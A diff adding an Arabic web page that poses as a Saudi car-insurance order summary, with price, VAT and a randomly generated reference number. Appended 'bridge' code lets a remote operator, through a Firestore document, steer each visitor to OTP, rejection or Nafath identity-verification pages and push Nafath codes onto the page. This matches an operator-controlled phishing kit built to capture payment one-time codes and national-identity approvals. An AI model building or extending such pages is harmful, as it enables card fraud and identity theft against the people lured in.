@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ملخص الطلب</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <style>
+        body { background-color: #e8f5e9; }
+        .form-wrapper {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 30px;
+            background: #d1e7dd;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        /* Step indicator styles */
+        .step-indicator { display: flex; justify-content: space-between; margin-bottom: 30px; color: #6c757d; font-size: 0.9rem; }
+        .step { text-align: center; flex: 1; position: relative; }
+        .step.active { color: #198754; font-weight: bold; }
+        .step-icon { width: 35px; height: 35px; background-color: #fff; border: 2px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px; }
+        .step.active .step-icon { border-color: #198754; background-color: #198754; color: #fff; }
+        
+        /* Summary styles */
+        .summary-card {
+            background: white;
+            border-radius: 8px;
+            padding: 25px;
+            border: 1px solid #198754;
+        }
+        .summary-details dl, .price-breakdown dl {
+            margin-bottom: 0;
+        }
+        .summary-details dt, .price-breakdown dt {
+            color: #6c757d;
+            font-weight: normal;
+        }
+        .summary-details dd, .price-breakdown dd {
+            font-weight: bold;
+            color: #333;
+        }
+        .price-breakdown .total-row dt, .price-breakdown .total-row dd {
+            font-size: 1.3rem;
+            color: #198754;
+        }
+        .border-end-md {
+            border-left: 1px solid #dee2e6;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="form-wrapper">
+        
+        <!-- Step Indicator -->
+        <div class="step-indicator">
+            <div class="step active"><div class="step-icon">✔</div><div>بيانات التأمين</div></div>
+            <div class="step active"><div class="step-icon">✔</div><div>قائمة الأسعار</div></div>
+            <div class="step active"><div class="step-icon">3</div><div>الملخص والدفع</div></div>
+        </div>
+
+        <h3 class="text-center mb-4 text-success">ملخص الوثيقة</h3>
+
+        <div class="summary-card">
+            <div class="row">
+                <!-- Policy Details -->
+                <div class="col-md-6 border-end-md">
+                    <h5 class="mb-3">تفاصيل الوثيقة</h5>
+                    <dl class="row summary-details">
+                        <dt class="col-sm-5">نوع التأمين</dt>
+                        <dd class="col-sm-7" id="summaryType">...</dd>
+
+                        <dt class="col-sm-5">تاريخ بدء الوثيقة</dt>
+                        <dd class="col-sm-7" id="summaryStartDate">...</dd>
+
+                        <dt class="col-sm-5">تاريخ انتهاء الوثيقة</dt>
+                        <dd class="col-sm-7" id="summaryEndDate">...</dd>
+
+                        <dt class="col-sm-5">الرقم المرجعي</dt>
+                        <dd class="col-sm-7" id="summaryRef">...</dd>
+                        
+                        <dt class="col-sm-5">الشركة</dt>
+                        <dd class="col-sm-7" id="summaryCompany">...</dd>
+                    </dl>
+                </div>
+
+                <!-- Price Breakdown -->
+                <div class="col-md-6">
+                    <h5 class="mb-3">التفاصيل المالية</h5>
+                    <dl class="row price-breakdown">
+                        <dt class="col-8">سعر الوثيقة</dt>
+                        <dd class="col-4 text-end" id="priceBase">0.00 ر.س</dd>
+
+                        <dt class="col-8">خصم عدم وجود مطالبات</dt>
+                        <dd class="col-4 text-end">(0.00 ر.س)</dd>
+
+                        <dt class="col-8 fw-bold">المجموع الجزئي</dt>
+                        <dd class="col-4 text-end fw-bold" id="priceSubtotal">0.00 ر.س</dd>
+
+                        <dt class="col-8">ضريبة القيمة المضافة (15%)</dt>
+                        <dd class="col-4 text-end" id="priceVat">0.00 ر.س</dd>
+                        
+                        <hr class="my-2">
+
+                        <dt class="col-8 total-row">المبلغ الإجمالي</dt>
+                        <dd class="col-4 text-end total-row" id="priceTotal">0.00 ر.س</dd>
+                    </dl>
+                    <p class="text-muted small mt-2 text-center">السعر شامل الضرائب والرسوم</p>
+                </div>
+            </div>
+            
+            <div class="d-grid mt-4">
+                <button class="btn btn-success btn-lg" onclick="window.location.href='payment.html'">تأكيد الطلب</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    window.onload = function() {
+        const params = new URLSearchParams(window.location.search);
+        const company = params.get('company');
+        const totalPrice = parseFloat(params.get('price'));
+        const type = params.get('type');
+
+        const subtotal = totalPrice / 1.15;
+        const vat = totalPrice - subtotal;
+        const startDate = new Date();
+        const endDate = new Date(startDate.getFullYear() + 1, startDate.getMonth(), startDate.getDate());
+
+        document.getElementById('summaryType').textContent = type === 'tpl' ? 'تأمين ضد الغير' : 'تأمين شامل';
+        document.getElementById('summaryStartDate').textContent = startDate.toISOString().split('T')[0];
+        document.getElementById('summaryEndDate').textContent = endDate.toISOString().split('T')[0];
+        document.getElementById('summaryRef').textContent = Math.floor(1000000000 + Math.random() * 9000000000);
+        document.getElementById('summaryCompany').textContent = company;
+        document.getElementById('priceBase').textContent = `${subtotal.toFixed(2)} ر.س`;
+        document.getElementById('priceSubtotal').textContent = `${subtotal.toFixed(2)} ر.س`;
+        document.getElementById('priceVat').textContent = `${vat.toFixed(2)} ر.س`;
+        document.getElementById('priceTotal').textContent = `${totalPrice.toFixed(2)} ر.س`;
+    };// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+</script>
+
+</body>
+</html>
